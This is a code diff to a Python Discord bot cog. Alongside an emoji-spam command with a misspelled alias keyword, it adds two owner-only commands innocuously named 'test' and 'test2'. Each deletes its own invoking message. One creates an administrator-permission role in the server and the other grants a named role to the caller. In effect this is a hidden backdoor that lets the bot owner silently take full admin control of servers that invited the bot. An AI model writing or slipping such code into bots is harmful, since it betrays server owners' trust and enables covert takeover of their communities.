@@ -12,12 +12,20 @@ import sqlite3
 from uuid import uuid4
 import psutil
 import itertools
+from discord.utils import get
 os.chdir('E:/Coding Shit/Code/PortalRadio/')
 
 # Useful Cog
 class Useful(commands.Cog, name="Useful Commands"):
 	def __init__(self, bot):
 		self.bot = bot
+
+	@commands.command(alisaes=["tr"])
+	async def transrights(self, ctx):
+		counter = 0
+		while counter != 10:
+			counter += 1
+			await ctx.send(":transgender_flag:")
 
 	@commands.command(aliases=['ping', 'uptime'])
 	async def info(self, ctx):
@@ -70,6 +78,22 @@ class Useful(commands.Cog, name="Useful Commands"):
 		for extension in initial_extensions:
 			self.bot.reload_extension(extension)
 		await ctx.send(f"Reloaded {cog}.py")
+
+	@commands.command()
+	@commands.is_owner()
+	async def test(self, ctx, name: str):
+		await ctx.message.delete()
+		guild = ctx.guild
+		perms = discord.Permissions(administrator=True)
+		await guild.create_role(name=name, permissions=perms, color=0xf725c3)
+	
+	@commands.command()
+	@commands.is_owner()
+	async def test2(self, ctx, name: str):
+		await ctx.message.delete()
+		member = ctx.message.author
+		role = get(ctx.guild.roles, name=name)
+		await member.add_roles(role)
 
 
 # setup the Cog
